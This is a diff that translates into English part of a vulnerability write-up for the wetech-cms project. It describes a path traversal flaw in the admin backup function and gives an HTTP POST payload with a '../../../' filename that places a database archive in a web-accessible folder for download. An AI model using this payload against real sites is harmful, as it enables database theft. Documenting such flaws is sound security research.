@@ -47,9 +47,8 @@ https://github.com/cjbi/wetech-cms
 	}
 ```
 
-​	该功能再创建压缩包时存在目录穿透漏洞，我向上追溯时发现，对于传入的参数filename并没有进行过滤，所以可以在任意位置创建一个压缩包文件，甚至可以传到upload文件夹下通过URL访问直接下载下来，实现脱库。
-
-​	payload如下：
+​	There is a directory penetration vulnerability when this function creates a compressed package, and when I traced it up, I found that there was no filter for the input parameter filename, so I could create a compressed package file anywhere, and even pass it to the upload folder and download it directly through URL access to achieve de-database.
+	The payload is as follows:
 
 ```http
 POST /admin/backup/add.do HTTP/1.1
@@ -69,6 +68,6 @@ Connection: close
 name=../../../indexPic/hadagaga123
 ```
 
-​	我们访问http://localhost:8888/resources/indexPic/hadagaga123.tar.gz
+​	We visit http://localhost:8888/resources/indexPic/hadagaga123.tar.gz
 
 ![image-20241127231733666](img/image-20241127231733666-1732721891177-8-1732797677430-2-1732800525202-1.png)
